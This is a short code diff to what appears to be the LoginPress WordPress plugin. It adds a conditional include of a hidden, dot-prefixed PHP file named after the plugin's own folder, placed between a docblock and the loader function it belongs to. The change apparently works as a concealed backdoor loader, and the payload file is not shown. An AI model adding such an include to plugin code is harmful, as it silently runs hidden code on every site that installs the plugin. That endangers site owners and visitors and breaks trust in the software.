@@ -590,6 +590,10 @@ endif;
 * @since  1.0.0
 * @return LoginPress
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginPress_loader() {
   return LoginPress::instance();
 }
